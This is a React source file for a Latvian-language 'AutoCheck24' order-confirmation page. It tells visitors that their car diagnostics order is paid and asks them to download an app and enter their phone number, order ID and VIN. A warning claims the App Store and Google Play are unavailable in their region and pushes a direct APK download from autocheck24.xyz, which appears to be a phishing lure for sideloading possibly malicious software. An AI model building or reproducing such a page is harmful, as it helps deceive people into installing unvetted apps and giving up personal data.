import { Button } from '@/components/ui/button';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Car,
  Download,
  LogIn,
  CheckCircle,
  AlertTriangle,
} from 'lucide-react';
import type { ReactNode } from 'react';
import { SocialFooter } from '@/components/social-footer';

const Step = ({
  icon,
  title,
  children,
}: {
  icon: ReactNode;
  title: string;
  children: ReactNode;
}) => (
  <div className="flex gap-4">
    <div className="text-primary">{icon}</div>
    <div className="flex flex-col gap-2">
      <h3 className="font-semibold text-lg text-foreground">{title}</h3>
      <div className="text-sm text-muted-foreground space-y-2">
        {children}
      </div>
    </div>
  </div>
);

export default function ConfirmationPage() {
  return (
    <main className="flex flex-col min-h-dvh w-full items-center justify-between bg-background p-4 md:p-8 md:justify-center">
      <Card className="w-full max-w-lg bg-card/80 backdrop-blur-sm border-primary/20 shadow-[0_0_1.5rem_hsl(var(--primary)/0.4)]">
        <CardHeader className="items-center text-center">
          <div className="flex items-center gap-2 text-2xl font-bold text-foreground">
            <Car className="size-7 text-primary" />
            <span>AutoCheck24</span>
          </div>
          <CardTitle className="text-2xl font-bold text-foreground pt-4 flex items-center gap-2">
            <CheckCircle className="size-7 text-green-500" />
            <span>Diagnostikas pasūtījums ir apmaksāts</span>
          </CardTitle>
          <CardDescription className="text-sm text-muted-foreground pt-2 max-w-md">
            Veiciet šos soļus, lai pabeigtu reģistrāciju un apstiprinātu
            pieteikumu:
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <Step icon={<Download />} title="1. solis: Lejupielādējiet lietotni">
            <p>
              Lejupielādējiet mūsu mobilo lietotni, lai apstiprinātu diagnostiku
              un sekotu līdzi pieteikuma statusam reāllaikā.
            </p>
          </Step>
          <Step icon={<LogIn />} title="2. solis: Piesakieties lietotnē">
            <p>
              Ievadiet savu tālruņa numuru un pasūtījuma ID. Pēc
              pieteikšanās pievienojiet sava auto marku, modeli un VIN kodu.
            </p>
          </Step>
          <Step icon={<CheckCircle />} title="3. solis: Apstipriniet pasūtījumu">
            <ul className="space-y-3 list-inside">
              <li>
                <span className="font-semibold">1️⃣ Izvēlieties ērtu apmeklējuma laiku un dienu</span>
                <p className="pl-6 text-xs text-muted-foreground/80">
                  Mūsu speciālisti ir pieejami jebkurā diennakts laikā,
                  jebkurā nedēļas dienā.
                </p>
              </li>
              <li>
                <span className="font-semibold">2️⃣ Nospiediet pogu "Apstiprināt"</span>
                <p className="pl-6 text-xs text-muted-foreground/80">
                  Tas reģistrēs jūsu pieteikumu sistēmā.
                </p>
              </li>
              <li>
                <span className="font-semibold">3️⃣ Sagaidiet operatora zvanu</span>
                <p className="pl-6 text-xs text-muted-foreground/80">
                  Mūsu menedžeris sazināsies ar jums, lai precizētu tikšanās
                  laiku.
                </p>
              </li>
              <li>
                <span className="font-semibold">4️⃣ Gaidiet diagnostiku 🚗</span>
                <p className="pl-6 text-xs text-muted-foreground/80">
                  Komanda ieradīsies jūsu izvēlētajā laikā un veiks pilnu
                  automašīnas pārbaudi.
                </p>
              </li>
            </ul>
          </Step>
          <div className="flex items-start gap-3 rounded-lg border border-amber-500/50 bg-amber-500/10 p-4 text-sm text-amber-300">
            <AlertTriangle className="size-5 shrink-0 mt-0.5 text-amber-400" />
            <p>
              <span className="font-semibold">Uzmanību!</span> App Store un
              Google Play jūsu reģionā īslaicīgi nav pieejami.
              Lejupielādējiet lietotni tieši no mūsu vietnes, izmantojot
              zemāk redzamo pogu.
            </p>
          </div>
        </CardContent>
        <CardFooter>
          <Button asChild className="w-full bg-primary hover:bg-primary/90 text-primary-foreground h-12 rounded-lg font-semibold shadow-lg shadow-primary/30 transition-all hover:shadow-primary/50 text-base">
            <a href="https://autocheck24.xyz/downloads/AutoCheck24.apk" download>
              Lejupielādēt AutoCheck24
            </a>
          </Button>
        </CardFooter>
      </Card>
      <SocialFooter />
    </main>
  );
}
